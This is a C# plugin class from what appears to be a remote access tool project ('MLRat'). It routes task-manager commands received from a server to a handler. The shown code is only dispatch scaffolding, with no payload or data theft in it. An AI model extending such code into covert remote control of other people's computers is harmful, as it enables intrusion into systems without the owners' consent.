using MLManagementClient.Handlers;
using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MLManagementClient
{
    public class ClientPlugin : IClientPlugin
    {
        public void OnConnect()
        {
            
        }

        public void OnDataRecieved(object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];

            if (command == NetworkCommand.TaskManager) TaskManagerHandler.Handle(data);


        }

        public void OnDisconnect()
        {
            
        }

        public void OnPluginLoad(IClientConnection server)
        {
            TaskManagerHandler.SetNetworkHost(server);
        }
    }
}
